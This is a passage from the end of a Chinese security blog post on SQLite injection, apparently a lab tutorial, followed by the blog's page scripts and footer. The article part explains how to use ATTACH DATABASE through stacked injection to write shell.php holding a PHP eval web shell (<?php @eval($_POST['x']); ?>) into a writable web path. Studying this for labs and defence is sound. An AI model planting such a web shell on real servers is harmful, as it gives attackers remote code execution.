+<p>使用ATTACH DATABASE在F:\sqlite_injection_lab\ 创建一个shell.php 并使用AS 将该数据库起一个shell别名 并创建一个名为exp的字段，并将<?php @eval($_POST["x"]); ?> 插入exp字段中：</p>
+<p>现在我们成功创建了shell.php </p>
+<img src="/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/image-20260723121426720.png" class="" loading="lazy">
+
+<p>注：使用该攻击的前提是支持堆叠注入，第二点是网站的路径可写</p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>K1r1t5u6u</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/" title="SQLite注入">https://web218.github.io/2026/07/23/SQLite%E6%B3%A8%E5%85%A5/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2026/07/22/Vulnhub%E9%9D%B6%E6%9C%BA--LAMPSecurity%20CTF5/" rel="next" title="Vulnhub靶机--LAMPSecurity CTF5"><span class="post-nav-text">Vulnhub靶机--LAMPSecurity CTF5</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><style>.utterances {
+  max-width: 100%;
+}</style><script src="https://utteranc.es/client.js" repo="web218/web218.github.io" issue-term="pathname" label="comment" theme="github-light" crossorigin="anonymous" async></script><script>(function() {
+  var themes = { dark: 'github-dark', light: 'github-light' };
+  function setTheme(theme, retries) {
+    retries = retries || 0;
+    var frame = document.querySelector('.utterances-frame');
+    if (!frame) return;
+    try {
+      frame.contentWindow.postMessage({ type: 'set-theme', theme: theme }, 'https://utteranc.es');
+    } catch(e) {
+      if (retries < 10) setTimeout(function() { setTheme(theme, retries + 1) }, 300);
+    }
+  }
+  function sync() {
+    setTheme(document.documentElement.classList.contains('dark') ? themes.dark : themes.light);
+  }
+  function waitForFrame(cb) {
+    var frame = document.querySelector('.utterances-frame');
+    if (frame) {
+      frame.addEventListener('load', cb);
+      // if already loaded
+      if (frame.contentWindow) setTimeout(cb, 100);
+      return;
+    }
+    setTimeout(function() { waitForFrame(cb) }, 200);
+  }
+  function onReady() { sync(); }
+  // listen for dark mode toggle click
+  document.addEventListener('click', function(e) {
+    var btn = e.target.closest('#toggle-mode-btn');
+    if (btn) setTimeout(onReady, 200);
+  });
+  // watch html class change
+  var obs = new MutationObserver(function() { onReady(); });
+  obs.observe(document.documentElement, { attributes: true, attributeFilter: ['class'] });
+  // initial sync when iframe ready
+  waitForFrame(onReady);
+})();</script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2025 – 2026 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:heart-3-line"></span></span><span class="author"> K1r1t5u6u</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script>(function(){
+  var words = ['富强✨','民主🌟','文明🔥','和谐💫','自由🎉','平等🎊','公正⚖️','法治📜','爱国❤️','敬业💪','诚信🤝','友善🌈'];
+  function spawn(e) {
+    var el = document.createElement('span');
+    el.textContent = words[Math.floor(Math.random() * words.length)];
+    el.style.cssText = 'position:fixed;left:' + (e.clientX - 20) + 'px;top:' + (e.clientY - 20) + 'px;font-size:20px;white-space:nowrap;color:hsl(' + (Math.random() * 360) + ',80%,60%);pointer-events:none;z-index:9999;transition:all 1.2s ease-out;opacity:1;transform:translateY(0)';
+    document.body.appendChild(el);
+    requestAnimationFrame(function() {
+      el.style.transform = 'translateY(-80px)';
+      el.style.opacity = '0';
+    });
+    setTimeout(function() { el.remove() }, 1400);
+  }
+  document.addEventListener('pointerdown', spawn, true);
+})();</script></body></html>
